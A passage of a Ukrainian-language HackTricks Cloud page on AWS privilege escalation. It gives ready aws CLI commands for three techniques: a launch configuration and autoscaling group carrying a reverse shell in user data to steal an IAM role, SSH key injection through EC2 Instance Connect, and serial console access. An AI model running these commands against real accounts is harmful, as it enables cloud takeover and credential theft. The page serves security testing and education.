–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑–∞–ø—É—Å–∫—É** –∑ **IAM-—Ä–æ–ª–ª—é** —Ç–∞ **rev shell** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, –ø–æ—Ç—ñ–º **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –≥—Ä—É–ø—É –∞–≤—Ç–æ–º–∞—Å—à—Ç–∞–±—É–≤–∞–Ω–Ω—è** –∑ —Ü—ñ—î—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ –∑–∞—á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ **rev shell –≤–∫—Ä–∞–¥–µ IAM-—Ä–æ–ª—å**.
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–∏–π –ø—ñ–¥–π–æ–º –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2.

### `!autoscaling`

–ù–∞–±—ñ—Ä –¥–æ–∑–≤–æ–ª—ñ–≤ **`ec2:CreateLaunchTemplate`** —Ç–∞ **`autoscaling:CreateAutoScalingGroup`** **–Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—ñ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è** –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª—ñ IAM, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–ª—è –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —Ä–æ–ª—ñ, –≤–∫–∞–∑–∞–Ω–æ—ó –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑–∞–ø—É—Å–∫—É –∞–±–æ –≤ —à–∞–±–ª–æ–Ω—ñ –∑–∞–ø—É—Å–∫—É, **–ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ `iam:PassRole` —Ç–∞ `ec2:RunInstances`** (—Ü–µ –≤—ñ–¥–æ–º–∏–π –ø—ñ–¥–π–æ–º –ø—Ä–∏–≤—ñ–ª–µ—ó–≤).

### `ec2-instance-connect:SendSSHPublicKey`

–ê—Ç–∞–∫—É—é—á–∏–π –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ec2-instance-connect:SendSSHPublicKey`** –º–æ–∂–µ –¥–æ–¥–∞—Ç–∏ –∫–ª—é—á ssh –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤—ñ–Ω –º–∞—î –¥–æ—Å—Ç—É–ø ssh –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞) –∞–±–æ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π IAM EC2, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** –º–æ–∂–µ **–¥–æ–¥–∞—Ç–∏ ssh-–∫–ª—é—á –¥–æ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ–≥–æ –∑'—î–¥–Ω–∞–Ω–Ω—è**. –Ø–∫—â–æ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–∏–π –ø–æ—Ä—Ç –Ω–µ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ—Ç—Ä–µ–±—É—î –¥–æ–∑–≤–æ–ª—É **`ec2:EnableSerialConsoleAccess` –¥–ª—è –π–æ–≥–æ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó**.

–î–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ–≥–æ –ø–æ—Ä—Ç—É –≤–∞–º —Ç–∞–∫–æ–∂ **–ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–∞—à–∏–Ω–∏.

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

–¶–µ–π —Å–ø–æ—Å—ñ–± –Ω–µ —î –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, —â–æ–± –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** (–î—É–∂–µ –Ω–µ–¥–æ–≤–µ–¥–µ–Ω–∏–π) –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π IAM EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

## References

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>
